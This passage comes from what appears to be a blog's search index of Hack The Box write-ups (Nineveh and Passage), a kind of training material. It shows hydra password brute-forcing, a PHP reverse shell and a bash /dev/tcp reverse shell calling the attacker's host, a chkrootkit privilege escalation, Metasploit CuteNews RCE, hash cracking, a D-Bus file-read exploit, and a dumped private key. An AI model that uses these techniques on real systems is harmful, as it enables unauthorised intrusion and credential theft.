54.zlib\n[root:…ninevehForAll.png.extracted]# file -b 54.zlib (master✱) zlib compressed data\n\nNot sure if this file is a rabbit hole or not, but I am unable to extract anything from it.\nhttps://10.10.10.43/db/index.php is a login page to phpLiteAdmin v1.9, however we don’t have any creds to login. The login doesn’t seem vulnerable to SQLi either, so lets skip this one for now.\nGo back to square one and start to fuzz port 80 with a bigger wordlist and we find http://10.10.10.43/department/\nroot@nidus:/git/htb/nineveh# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.43/FUZZ\n  --- snip ---\n  department              [Status: 301, Size: 315, Words: 20, Lines: 10]\n\nWe find a new login page http://10.10.10.43/department/login.php. In the source code we find a comment ‘@admin! MySQL is been installed.. please fix the login page! ~amrois’\n\nTrying /department/login.php for sql auth bypass fails. But we have a user, amrois, so we can try to password spray the login. Running hydra with user ‘amrois’ give a lot of false possitives, making us unable to brute the password. Hydra on user ‘admin’ however works!\n[root:/git/htb/nineveh]# hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV -f 10.10.10.43 http-post-form “/department/login.php:username=USER&password=PASS:Invalid Password” — snip — [ATTEMPT] target 10.10.10.43 - login “admin” - pass “gerson” - 4575 of 14344399 [child 3] (0/0) [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t\nWE GOT CREDS! admin:1q2w3e4r5t on http://10.10.10.43/department/login.php\n\nLooking around on the page, we find ‘Notes’ saying: &gt; Have you fixed the login page yet! hardcoded username and password is really bad idea! &gt; check your serect folder to get in! figure it out! this is your challenge &gt; Improve the db interface. &gt;~amrois\n\n\nBinwalk:ing the image gives nothing.\nThe note-page looks like it would be prone to LFI, however I can’t find anything.\n\nThe note says something about hardcoded creds, lets try to brute force https://10.10.10.43/db/index.php as well.\n[root:/git/htb/nineveh]# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -vV -f https-post-form ‘/db/index.php:password=PASS&remember=yes&logn=Log+In&proc_login=true:Incorrect password’ — snip — [ATTEMPT] target 10.10.10.43 - login “admin” - pass “harry” - 1404 of 14344399 [child 7] (0/0) [443][http-post-form] host: 10.10.10.43 login: admin password: password123\nAnother set of working creds! admin:password123 on https://10.10.10.43/db/index.php\n\nSearch for known phpLiteAdmin v1.9 vulns.\n\n\n\n\noot:…ninevehForAll.png.extracted]# searchsploit phpliteadmin\n(master✱)\n\n\n\n\nExploit Title |\nPath\n\n\n\nPHPLiteAdmin 1.9.3 - Remote PHP Code Injection | php/webapps/24044.txt\n\nCreate a new database named ‘ninevehNotes.php’\nCreate a new table, Name: “test”, Number of Fields: “1”\nIn field write: ‘’, and change Type from ‘INTEGER’ to ‘TEXT’\nIf everything is correct, you should now have RCE through the LFI: http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=ls\n\n\nThrough the RCE, setup a php reverse shell - remember you need to url encode it first.\n\nURL: http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.14.10%22%2C4488%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 [root:/git/htb/nineveh]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.43] 59940 /bin/sh: 0: can’t access tty; job control turned off $ whoami www-data\n\nEnumerate the box and we find a file with a curious filename ‘ninevehdestruction.jpg’, located in /var/www/html\n\nTransfer the .jpg to local Kali box to investigate with Binwalk. [root:/git/htb/nineveh]# nc -lp 4400 &gt; ninevehdestruction.jpg www-data@nineveh:/var/www/html$ nc -w 3 10.10.14.10 4400 &lt; ninevehdestruction.jpg\n[root:/git/htb/nineveh]# binwalk ninevehdestruction.jpg (master✱)\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             JPEG image data, EXIF standard\n12            0xC             TIFF image data, little-endian offset of first image directory: 8\nThere’s nothing we can extract. Continue with the enum and we find ‘/var/www/ssl/secure_notes’ and within ‘nineveh.png’, maybe this png will hold some information! Transfer it and look with binwalk.\n[root:/git/htb/nineveh]# binwalk nineveh.png (master✱)\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced\n84            0x54            Zlib compressed data, best compression\n2881744       0x2BF8D0        POSIX tar archive (GNU)\nExtract the data (binwalk -e) and pray for loot!\n[root:/git/htb/nineveh]# binwalk -e nineveh.png [root:/git/htb/nineveh]# ls -alR _nineveh.png.extracted (master✱) _nineveh.png.extracted: total 2852 drwxr-xr-x 3 root root 4096 Feb 25 16:54 . drwxr-xr-x 4 root root 4096 Feb 25 16:54 .. -rw-r–r– 1 root root 10240 Feb 25 16:54 2BF8D0.tar -rw-r–r– 1 root root 0 Feb 25 16:54 54 -rw-r–r– 1 root root 2891900 Feb 25 16:54 54.zlib drwxr-xr-x 2 www-data www-data 4096 Jul 2 2017 secret\n_nineveh.png.extracted/secret: total 16 drwxr-xr-x 2 www-data www-data 4096 Jul 2 2017 . drwxr-xr-x 3 root root 4096 Feb 25 16:54 .. -rw——- 1 www-data www-data 1675 Jul 2 2017 nineveh.priv -rw-r–r– 1 www-data www-data 400 Jul 2 2017 nineveh.pub\nWe got a private key, however SSH is not open. Maybe this is a rabbit hole, I’ll dig deeper in the box with linpeas.\n\nUsing linpeas we can see that SSH-files exists, and port 22 is listening locally.\n[+] Looking for ssl/ssh files /home/amrois/.ssh/authorized_keys /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config Port 22 PubkeyAuthentication yes PermitEmptyPasswords no ChallengeResponseAuthentication no PasswordAuthentication no UsePAM yes –&gt; Some certificates were found (out limited): /etc/apache2/ssl/nineveh/nineveh.crt\n--&gt; /etc/hosts.allow file found, read the rules:\n[+] Active Ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -\n\nTransfer the private key to the victim machine, and ssh internally.\nwww-data@nineveh:/dev/shm$ ssh amrois@127.0.0.1 -i nineveh.priv\namrois@nineveh:~$ whoami\n  amrois\namrois@nineveh:~$ cat user.txt\n  82b21cf2928d940081bf79b85edcc26c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nRunning linpeas.sh we can see that the PATH is changed, where /home/amrois is at the beginning.\n\n[+] PATH /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin New path exported: /home/amrois/bin:/home/amrois/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nAnd a cron job running a script.\n[+] Cron jobs\n# m h  dom mon dow   command\n*/10 * * * * /usr/sbin/report-reset.sh\namrois@nineveh:/dev/shm$ cat /usr/sbin/report-reset.sh cat /usr/sbin/report-reset.sh #!/bin/bash\nrm -rf /report/*.txt\nGuessing from that script, something should be writing reports to /report on a regular basis. Upload pspy64 to see what service and if we can exploit it.\n2021/02/25 10:57:03 CMD: UID=0 PID=863 | /bin/sh /usr/bin/chkrootkit 2021/02/25 10:57:03 CMD: UID=0 PID=862 | /bin/sh /usr/bin/chkrootkit 2021/02/25 10:57:03 CMD: UID=0 PID=867 | /bin/sh /usr/bin/chkrootkit 2021/02/25 10:57:03 CMD: UID=0 PID=866 | /bin/sh /usr/bin/chkrootkit\n\nReading more about chkrootkit we find a major vulnerability - it there is a executable file named ‘update’ in /tmp/ chkrootkit will execute it, as root. Since the cron job automatically triggers chkrootkit, this will be our path to root.\nCreate a reverse shell named ‘update’ in /tmp/, give it execute privs and with for incomming root shell.\namrois@nineveh:/tmp$ cat update #!/bin/bash bash -i &gt;& /dev/tcp/10.10.14.10/4444 0&gt;&1\namrois@nineveh:/tmp$ chmod +x update\n[root:~]# nc -lvnp 4444 listening on [any] 4444 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.43] 40310 bash: cannot set terminal process group (20042): Inappropriate ioctl for device bash: no job control in this shell root@nineveh:~# whoami root root@nineveh:~# cat /root/root.txt f1b9f3a15a4cf8f89d9285e948b66432\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPHPLiteAdmin 1.9 RCE: https://www.exploit-db.com/exploits/24044 https://v3ded.github.io/ctf/zico2\nChkrootkit privesc: https://www.exploit-db.com/exploits/33899"
  },
  {
    "objectID": "posts/2020-09-10-htb-writeup-passage/2020-09-10-htb-writeup-passage.html",
    "href": "posts/2020-09-10-htb-writeup-passage/2020-09-10-htb-writeup-passage.html",
    "title": "Passage - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb# nmap -Pn -n -sC -sV 10.10.10.206 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\n\n\nNIKTO:\n\n\n\nBrowsing the webserver we are presented with a simple News page. They inform us that fail2ban is installed making us unable to enumerate with DIRB and/or Nikto. From the page we can extract usernames from the different posts;\nadmin kim swift sid meier paul coler\nPressing the RSS-button we are forwarded to http://10.10.10.206/CuteNews/rss.php, the folder CuteNews is new to us. Browsing only that folder and we are presented with a login prompt for CuteNews 2.1.2; http://10.10.10.206/CuteNews/\n\n\n\not@nidus:/git/htb/passage# searchsploit cutenews\n\n\n\n\n\nExploit Title |\nPath\n\n\n\n[..] CuteNews 2.1.2 - ‘avatar’ Remote Code Execution (Metasploit) | php/remote/46698.rb CuteNews 2.1.2 - Arbitrary File Deletion | php/webapps/48447.txt CuteNews 2.1.2 - Authenticated Arbitrary File Upload | php/webapps/48458.txt\nroot@nidus:/git/htb/passage# searchsploit -x php/remote/46698.rb | xclip root@nidus:/git/htb/passage# vi cutenews_avatar_rce.rb root@nidus:~/.msf4/modules# mkdir -p exploits/unix/webapp/ root@nidus:~/.msf4/modules# mv /git/htb/passage/cutenews_avatar_rce.rb exploits/unix/webapp/\nAs the exploit is authenticated, Register a new user and enter it’s credentials in the exploit code.\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; set rhosts 10.10.10.206 msf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; set lhost 10.10.14.12 msf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; set lport 4400 msf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; set password playerthree msf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; set username playerthree msf5 exploit(unix/webapp/cutenews_avatar_rce) &gt; run\n[*] Started reverse TCP handler on 10.10.14.12:4400 [*] http://10.10.10.206:80 - CuteNews is 2.1.2 [+] Authentication was successful with user: playerthree [*] Trying to upload cuqznmgo.php [+] Upload successfully. [*] Sending stage (38288 bytes) to 10.10.10.206 [*] Meterpreter session 1 opened (10.10.14.12:4400 -&gt; 10.10.10.206:44244) at 2020-09-10 12:02:16 +0200\nmeterpreter &gt; shell Process 1984 created. Channel 0 created.\nwhoami\nwww-data\nEnumerate continue your enumeration. In the webserver we find a users map (/var/www/html/CuteNews/cdata/users) containing a lot of base64 encoded data.\ncat lines  YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319  YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=  YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319  YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=  YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=  YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==  YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319  YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==  YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=  YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==  YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319  YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19  YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=    YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=  YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=\nGoing through all the base64 rows we find a list of usernames and password (SHA256) hashes. Add them all to lists and try to crack them. root@nidus:/git/htb/passage# cat hashes-all.txt 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc 731555aa24389a30b3d0e5dfb9730baffc2c97a2b07493c7bed8e4317657bde0\nroot@nidus:/git/htb/passage# hashcat -a0 -m1400 hashes-all.txt /usr/share/wordlists/rockyou.txt -o cracked-all.txt [..] Status………..: Exhausted Hash.Name……..: SHA2-256 Hash.Target……: hashes-all.txt\nroot@nidus:/git/htb/passage# cat cracked-all.txt e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1\n\nThe cracked password is for the user paul. In our RCE session we can verify that paul has a active account, lets try for password re-use.\nsu paul su: must be run from a terminal python -c ‘import pty;pty.spawn(“/bin/bash”)’ www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul Password: atlanta1\npaul@passage:/var/www/html/CuteNews/cdata/users$\n\nGrab user.txt, and download id_rsa\npaul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul paul@passage:~$ cat user.txt c8160b868ed602348c15191205f76ab8\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nChange user from Paul to Navdav using the SSH-key.\npaul@passage:~/.ssh$ ssh nadav@10.10.10.206 -i id_rsa Last login: Thu Sep 10 04:29:35 2020 from 10.10.10.206 nadav@passage:~$\n\nWhen enumerating there’s a lot of things pointing towards dbus, and specifically com.ubuntu.USBCreator.\nLINPEAS:\n[+] Modified interesting files in the last 5mins\n  /home/nadav/.dbus/session-bus/4a23f1f5846e4890b0997d28c0fdd9e3-0\n  /home/nadav/.local/share/keyring-crack\n\nnadav@passage:~$ cat .viminfo\n  [..]\n  # File marks:\n  '0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf\n\nDig deeper into dbus USBCreator and we find a few interesting articles, all linked below.\nTo verify it’s a valid path towards root we check the process and confirm it’s run by root. nadav@passage:~$ busctl status com.ubuntu.USBCreator PID=33852 [..]\nnadav@passage:~$ ps aux | grep 33852 root 33852 0.0 0.4 235548 20052 ? Sl 05:02 0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper\nEnumerate the dbus service to find it’s path (tree) and a method (introspect) to exploit.\nnadav@passage:~$ busctl tree com.ubuntu.USBCreator └─/com └─/com/ubuntu └─/com/ubuntu/USBCreator\nnadav@passage:~$ busctl introspect com.ubuntu.USBCreator /com/ubuntu/USBCreator NAME TYPE SIGNATURE RESULT/VALUE FLAGS com.ubuntu.USBCreator interface - - - .Image method ssb - - .KVMOk method - b - .KVMTest method sa{ss} - - .Shutdown method - - - .Unmount method s - - .Progress signal u - - org.freedesktop.DBus.Introspectable interface - - - .Introspect method - s -\nExploit dbus USBCreator with the found information, start by doing a simple PoC.\nThe purpose of this PoC is to copy the content of /dev/shm/p3/a.txt and write it to /dev/shm/a.txt as user root.\nnadav@passage:~$ echo “Test” &gt; /dev/shm/p3/a.txt nadav@passage:~$ ls -al /dev/shm/ | grep a.txt\nnadav@passage:~$ gdbus call –system –dest com.ubuntu.USBCreator –object-path /com/ubuntu/USBCreator –method com.ubuntu.USBCreator.Image /dev/shm/p3/a.txt /dev/shm/a.txt true nadav@passage:~$ ls -al /dev/shm/ | grep a.txt -rw-r–r– 1 root root 5 Sep 10 06:23 a.txt\nThe PoC is a success! Now we can do the same with either root.txt, id_rsa or any other file of interest.\nDo the exploit for real and grab root.txt.\nnadav@passage:~$ gdbus call –system –dest com.ubuntu.USBCreator –object-path /com/ubuntu/USBCreator –method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/a.txt true () nadav@passage:~$ cat /dev/shm/a.txt —–BEGIN RSA PRIVATE KEY—– MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE +WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6 U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP 0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY 8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy /6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7 yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c= —–END RSA PRIVATE KEY—–\nroot@nidus:/git/htb/passage# ssh root@passage.htb -i root_id-rsa load pubkey “root_id-rsa”: invalid format Last login: Thu Sep 10 04:57:24 2020 from 10.10.14.10 root@passage:~# hostname && id passage uid=0(root) gid=0(root) groups=0(root)\nroot@passage:~# cat root.txt 866759f7ccb3f776b2fd176279971213\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nCuteNews RCE (Authenticated) https://github.com/rapid7/metasploit-framework/issues/13246 https://www.exploit-db.com/exploits/46698\nDBus Priv Esc https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"
  },
  {
    "objectID": "posts/2022-01-24-htb-writeup-hancliffe/2022-01-24-htb-writeup-hancliffe.html",
    "href": "posts/2022-01-24-htb-writeup-hancliffe/2022-01-24-htb-writeup-hancliffe.html",
    "title": "Hancliffe - Hack The Box",
    "section": "",
